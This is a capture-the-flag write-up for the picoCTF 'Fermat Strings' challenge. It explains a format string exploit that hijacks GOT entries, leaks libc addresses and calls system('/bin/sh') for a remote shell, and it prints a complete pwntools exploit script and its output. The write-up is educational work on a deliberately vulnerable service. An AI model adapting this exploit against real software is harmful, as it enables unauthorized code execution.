# Fermat Strings

The description of this challenge was as follows:

*Author: notdeghost*

*Description*

*Fermat's last theorem solver as a service.*

*nc mars.picoctf.net 31929*

The challenge was in the binary exploitation category, and it was worth 250 points. You were given the C source code, the binary file, and a Dockerfile. At least with my solve, I found it a steep increase in difficulty from the previous binary exploitation challenge, and it had comparatively few solves. I am questioning whether my solve was the intended one, so please bear that in mind.

**TL;DR Solution:** Use a format string vulnerability to overwrite the GOT entry for pow() to the address of main() so that the program loops forever, then leak libc addresses from the GOT table. Use this information to derive libc version, libc base, and the libc address of system. Then overwrite the GOT entry of strcspn() to the libc address of system(). Since this function takes user-provided arguments in the program, you can then pass it /bin/sh and get a shell.

My initial interaction with the program got me this result:
```
knittingirl@piglet:~/CTF/pico21_mini$ ./fermat_strings 
Welcome to Fermat\'s Last Theorem as a service
A: 34
B: 23
Calculating for A: 34 and B: 23

```
And the results of checksec look like this:
```
knittingirl@piglet:~/CTF/pico21_mini$ checksec fermat_strings 
[*] '/home/knittingirl/CTF/pico21_mini/fermat_strings'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```
Based on the title, I know that format strings should be involved somehow in this challenge. After looking at the C code and experimenting a bit, I discovered that as long as our inputs for A and B begin with at least 1 digit to satisfy the atoi() call and check, we can then add in working format strings that will be read into the variable buffer with snprintf, then printed with printf. 
```
a = atoi(A);
  b = atoi(B);

  if(a == 0 || b == 0) {
    puts("Error: could not parse numbers!");
    return 1;
  }

  char buffer[SIZE];
  snprintf(buffer, SIZE, "Calculating for A: %s and B: %s\n", A, B);
  printf(buffer);
```
Now, this program does not include a win function or any reference to a libc function that can, to the best of my knowledge, be used to obtain a shell, read a file, etc. As a result, the only strategy that makes sense at this point is to figure out how to call system from libc.

The plan to achieve this has three main steps. Firstly, the main function will only run once by default, so we only have one opportunity to use the format string vulnerability. Fortunately, since there is no PIE and partial RELRO, we can actually overwrite an entry in the GOT table to point back to the beginning of the main function and effectively set up an ongoing loop. The pow() function was very convenient for this purpose, since it is only called after the format string vulnerability has completed.

In order to perform this first overwrite, we need to get the GOT entry address for pow() (I got it from gdb) and the address for main() (I got it from Ghidra). We then need to establish exactly which stack offset will print characters passed by our input. One important thing to note here is because of the way that these strings are passed in, they will terminate when they hit any nulls in the string. As a result, to write to or leak from a specific address, we have to place it at the end of our A or B string answer. The basic script for that is here:
```
from pwn import *

#target = process('./fermat_strings') 

#pid = gdb.attach(target, "\nb *main+416\ncontinue")

target = remote('mars.picoctf.net', 31929)

#Gadgets:
pow_got_plt = p64(0x601040)
main = 0x00400837

print(target.recvuntil(b'A:'))
#I have to load the location here because nulls.
payload = b'12345678' + b'a' * 8 

target.sendline(payload)

print(target.recvuntil(b'B:'))

payload = b'12' + b'%p' * 100 

target.sendline(payload)


print(target.recvuntil(b'and B:'))
target.interactive()
```
And the results are here:
```
knittingirl@piglet:~/CTF/pico21_mini$ python3 fermat_strings_writeup.py 
[+] Opening connection to mars.picoctf.net on port 31929: Done
b"Welcome to Fermat\\'s Last Theorem as a service\nA:"
b' B:'
b' Calculating for A: 12345678aaaaaaaa and B:'
[*] Switching to interactive mode
 120x400bd80x7ffcd5ee6bd6(nil)0xffffffff0x7ffcd5ee6750(nil)(nil)0x7ffcd5ee69800xc00bc614e0x38373635343332310x61616161616161610x7fedfe6d47000x7fedfe7034f80x7ffcd5ee69800x7fedfe6d40000x7fedfe6d4a140x7fedfe6d44c00x7fedfe702048(nil)0x10x7fedfe3977900x7fedfe6d4b000x4c80x2a(nil)(nil)(nil)(nil)(nil)0x7fedfe38c0000x15f0db230d9efa(nil)0x7fedfe7031900xfffffffffffffff80x7fedfe6edee00x7ffcd5ee6bb00x7fedfe6d87ab(nil)(nil)(nil)(nil)0x70257025702532310x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x7025(nil)0x340000002400x380000003800x5c0000003c00x9c0000009c00x9c0000009c00x74616c75636c61430x20726f6620676e690x3534333231203a410x61616161613837360x20646e61206161610x2570253231203a420x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x25702570257025700x2570257025702570
[*] Got EOF while reading in interactive
$  

```
The string of 0x61's are at the 11th offset, so if we put an arbitrary address there and reference it with some variation of %11$n, we can do an arbitrary overwrite. At this stage, we want to overwrite the GOT entry for pow() to point back to main. Since pow() hasn't been called, the address there currently points back to the PLT table, which is in the same area of the program as main. As a result, only overwriting the low two bytes of the entry should have the desired result, and this can be achieved with a %hn. The adjusted portion of the script is below:
```
#Gadgets:
pow_got_plt = p64(0x601040)
main = 0x00400837

print(target.recvuntil(b'A:'))
#I have to load the location here because nulls.
payload = b'12345678' + pow_got_plt

target.sendline(payload)

print(target.recvuntil(b'B:'))

#This one will set me up to reroll main forever.
#A quick test run without the %x portion shows that by default, addresses here get overwritten with 0x28
#The 2063 is 0x0837 (low bytes of main address) - 0x28
payload = b'12' + b'%2063x%11$hn' 

target.sendline(payload)


print(target.recvuntil(b'and B:'))
#print(target.recv(20))

print(target.recvuntil(b'A:'))
```
And a quick test run shows that we have achieved the goal of repeating main() indefinitely:
```
knittingirl@piglet:~/CTF/pico21_mini$ python3 fermat_strings_writeup.py 
[+] Opening connection to mars.picoctf.net on port 31929: Done
b"Welcome to Fermat\\'s Last Theorem as a service\nA:"
b' B:'
b' Calculating for A: 12345678@\x10` and B:'
b" 12                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         400bd8\nWelcome to Fermat\\'s Last Theorem as a service\nA:"
[*] Switching to interactive mode
 $ 23
B: $ 45
Calculating for A: 23 and B: 45
Welcome to Fermat\'s Last Theorem as a service
A: $  
```
Since I can't find any evidence of a win function, the obvious choice at this point is to try to use libc. So, I will have to leak the libc version. I should be able to leak the contents of arbitrary got functions by using a similar method to my overwrite of the pow() entry, but with %s instead of %n. The relevant section of the script is:
```
printf_got_plt = p64(0x601030)

print(target.recvuntil(b'A:'))

payload = b'12345678' + printf_got_plt

target.sendline(payload)
print(target.recvuntil(b'B:'))
payload = b'12' + b'%11$s'
target.sendline(payload)
print(target.recvuntil(b'B: 12'))
leak = target.recv(6)
printf_libc = u64(leak + b'\x00' * 2)
print('printf libc is: ', hex(printf_libc))
```
This gets us an output of:
```
knittingirl@piglet:~/CTF/pico21_mini$ python3 fermat_strings_writeup.py
[+] Opening connection to mars.picoctf.net on port 31929: Done
b"Welcome to Fermat\\'s Last Theorem as a service\nA:"
b' B:'
b' Calculating for A: 12345678@\x10` and B:'
b' 12                 '
b"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        400bd8\nWelcome to Fermat\\'s Last Theorem as a service\nA:"
b' B:'
b' Calculating for A: 123456780\x10` and B: 12'
printf libc is:  0x7ff93ae83e10
[*] Switching to interactive mode

Welcome to Fermat\'s Last Theorem as a service
A: [*] Got EOF while reading in interactive
$  
```
If we repeat that while substituting in read_got_plt, we get:
```
b' Calculating for A: 12345678P\x10` and B: 12'
read libc is:  0x7f9e63c0a130

```
If we plug those values into blukat, we get two possible libc libraries (see here: https://libc.blukat.me/?q=printf%3Ae10%2Cread%3A130). I experimented with adding more libc leaks, but that did not seem to reduce the list; fortunately, the offsets across the libraries are virtually identical, and most importantly, the libc offset remained consistent. As a result, I was able to download one and use its offsets.

The final step is to calculate the libc address of system(), then overwrite an appropriate GOT entry with that address. I selected the strcspn function, since if we look at the code, we can see that it is called on the user-provided variables of A and B, which we could simply set to /bin/sh after the overwrite in order to pop a shell. Overwrite atoi would probably also work nicely for a similar reason.
```
 A[strcspn(A, "\n")] = 0;
 B[strcspn(B, "\n")] = 0;
 a = atoi(A);
 b = atoi(B);
```
This overwrite requires us to overwrite the lowest four bytes of the current contents of the GOT entry for strcspn. Trying to do this in a single pass would require us to send a lot of padding, which would take a really long time and might not work. Instead, we work out an offset that points to the end of the input for B (with room for padding, since we will have to send a variable-length format string payload prior to the address). We can then overwrite the lowest two bytes, then the next lowest two bytes of the GOT entry. 


The final script looks like this:
```
from pwn import *

#target = process('./fermat_strings')

#pid = gdb.attach(target, "\nb *main+416\ncontinue")

target = remote('mars.picoctf.net', 31929)

elf = ELF("fermat_strings")
libc = ELF("libc6_2.31-0ubuntu9.1_amd64.so")

#Gadgets:
pow_got_plt = p64(0x601040)
main = 0x00400837
printf_got_plt = p64(0x601030)
puts_got_plt = p64(0x601018)
setbuf_got_plt = p64(0x601028)
snprintf_got_plt = p64(0x601038)
strcspn_got_plt = p64(0x601048)
strcspn_got_plt2 = p64(0x601048 + 2)
read_got_plt = p64(0x601050) #read brings it down to two options
atoi_got_plt = p64(0x601058)

print(target.recvuntil(b'A:'))
#I have to load the location here because nulls.
payload = b'12345678' + pow_got_plt

target.sendline(payload)

print(target.recvuntil(b'B:'))

#This one will set me up to reroll main forever.
payload = b'12' + b'%2063x%11$hn'

target.sendline(payload)


print(target.recvuntil(b'and B:'))
print(target.recv(20))

print(target.recvuntil(b'A:'))

payload = b'12345678' + printf_got_plt

target.sendline(payload)
print(target.recvuntil(b'B:'))
payload = b'12' + b'%11$s'
target.sendline(payload)
print(target.recvuntil(b'B: 12'))
leak = target.recv(6)
printf_libc = u64(leak + b'\x00' * 2)
libc_base = printf_libc - libc.symbols['printf']

system_libc = libc_base + libc.symbols['system']
print('printf libc is: ', hex(printf_libc))
print('system libc should be: ', hex(system_libc))


#Now we do the final overwrite with our libc leak.
print(target.recvuntil(b'A:'))

payload = b'12345678' + strcspn_got_plt

target.sendline(payload)

print(target.recvuntil(b'B:'))

#So now we have to carefully, programmatically refine our payload
print('system libc should be: ', hex(system_libc))
system_last_bytes = system_libc & 0xffff
print('system last bytes: ', hex(system_last_bytes), system_last_bytes)
system_next_bytes = (system_libc & 0xffff0000) // 0x10000
print('system next bytes: ', hex(system_next_bytes), system_next_bytes)
print(str(system_last_bytes).encode('ascii'))

#These are determined by using got command in gdb to check how it's looking
part1 = b'%' + str(system_last_bytes - 0x28).encode('ascii') + b'x%11$hn'
print(part1)

part2 = b'%' + str(0x10000 + system_next_bytes - system_last_bytes - 1).encode('ascii') + b'x%46$hn'
print(part2)
#The bits of padding are important since I'm referencing an address at the very end of the payload, so length until then must remain constant.
payload = b'12' + part1 + b'a' * (14 - len(part1)) + part2 + b'a' * (16 - len(part2)) + strcspn_got_plt2
target.sendline(payload)
print(target.recvuntil(b'A:'))

#This effectively calls system('/bin/sh')
target.sendline(b'/bin/sh')
print(target.recvuntil(b'B:'))
target.sendline(b'/bin/sh')

target.interactive()
```

And the result looks like this:
```
knittingirl@piglet:~/CTF/pico21_mini$ python3 fermat_strings_payload.py
[+] Opening connection to mars.picoctf.net on port 31929: Done
[*] '/home/knittingirl/CTF/pico21_mini/fermat_strings'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/knittingirl/CTF/pico21_mini/libc6_2.31-0ubuntu9.1_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
b"Welcome to Fermat\\'s Last Theorem as a service\nA:"
b' B:'
b' Calculating for A: 12345678@\x10` and B:'
b' 12                 '
b"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        400bd8\nWelcome to Fermat\\'s Last Theorem as a service\nA:"
b' B:'
b' Calculating for A: 123456780\x10` and B: 12'
printf libc is:  0x7fd6fe4dbe10
system libc should be:  0x7fd6fe4cc410
b"\nWelcome to Fermat\\'s Last Theorem as a service\nA:"
b' B:'
system libc should be:  0x7fd6fe4cc410
system last bytes:  0xc410 50192
system next bytes:  0xfe4c 65100
b'50192'
b'%50152x%11$hn'
b'%80443x%46$hn'
b' Calculating for A:'
b' 12345678H\x10` and B:'
[*] Switching to interactive mode
 12                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  400bd8a                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   f093303aaaaJ\x10
Welcome to Fermat\'s Last Theorem as a service
A: B: $ whoami
whoami: cannot find name for user ID 1000
$ ls
flag.txt
run
$ cat flag.txt
picoCTF{REDACTED}
[*] Got EOF while reading in interactive
$  


```
